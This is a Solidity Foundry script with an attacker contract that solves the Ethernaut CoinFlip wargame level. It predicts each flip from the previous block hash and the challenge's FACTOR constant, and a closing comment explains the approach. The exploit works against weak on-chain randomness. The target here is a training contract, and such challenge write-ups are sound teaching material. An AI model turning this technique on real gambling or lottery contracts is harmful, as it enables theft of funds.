// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/CoinFlip.sol";
import "../lib/forge-std/src/Script.sol";

contract CoinFlipAttackScript is Script {

    // Instance of the CoinFlip contract
    // Replace 0xYourInstanceAddressHere with the actual instance address of the deployed CoinFlip contract
    CoinFlip public coinFlipContract = CoinFlip(0xYourInstanceAddressHere);

    // Attacker contract instance
    CoinFlipAttacker coinFlipAttackerContract;

    // Run function to deploy the attacker contract and execute the attack
    function run() external {
        // Start broadcasting transactions from the private key associated with the environment variable
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy a new instance of the CoinFlipAttacker contract each time run is called
        coinFlipAttackerContract = new CoinFlipAttacker(address(coinFlipContract));

        // Log the number of consecutive wins after the attack
        console.log("Consecutive Wins: ", coinFlipContract.consecutiveWins());

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}

// Attacker contract for the CoinFlip challenge
contract CoinFlipAttacker {

    // Reference to the CoinFlip contract
    CoinFlip public coinFlipContract;

    // Store the last block hash used for the prediction
    uint256 lastBlockHash;

    // The constant FACTOR value used to predict the coin flip result
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Constructor receives the address of the deployed CoinFlip contract
    constructor(address coinFlipContractAddress) {
        coinFlipContract = CoinFlip(payable(coinFlipContractAddress));

        // Get the hash of the previous block to use in the prediction
        uint256 blockHashValue = uint256(blockhash(block.number - 1));

        // Prevent reusing the same block hash for predictions
        if (lastBlockHash == blockHashValue) {
            return;
        }
        lastBlockHash = blockHashValue;

        // Calculate the coin flip outcome based on the block hash and FACTOR
        uint256 coinFlipOutcome = blockHashValue / FACTOR;
        bool predictedSide = coinFlipOutcome == 1 ? true : false;

        // Call the flip function on the CoinFlip contract with the predicted outcome
        coinFlipContract.flip(predictedSide);
    }
}

/*
Explanation:

1. The `CoinFlipAttackScript` contract contains the main attack logic. It uses the `CoinFlipAttacker` contract 
   to predict the outcome of the coin flip by leveraging the block hash. 

2. Every time `run()` is called, a new instance of `CoinFlipAttacker` is deployed. While this works, it is inefficient, 
   as deploying the contract repeatedly is unnecessary. A more efficient approach would be to deploy the 
   `CoinFlipAttacker` contract only once and reuse the deployed instance across script runs. For the sake of simplifying the script file to be used by others, i used this approach.

3. The `CoinFlipAttacker` contract calculates the coin flip result based on the block hash of the previous block 
   (`blockhash(block.number - 1)`) and compares it against the FACTOR constant. It then calls the `flip()` function 
   on the `CoinFlip` contract with the predicted result (heads or tails).

4. To ensure success in the Ethernaut challenge, this script needs to be executed until the `consecutiveWins()` 
   in the CoinFlip contract reaches 10, which is logged each time the script is run.
*/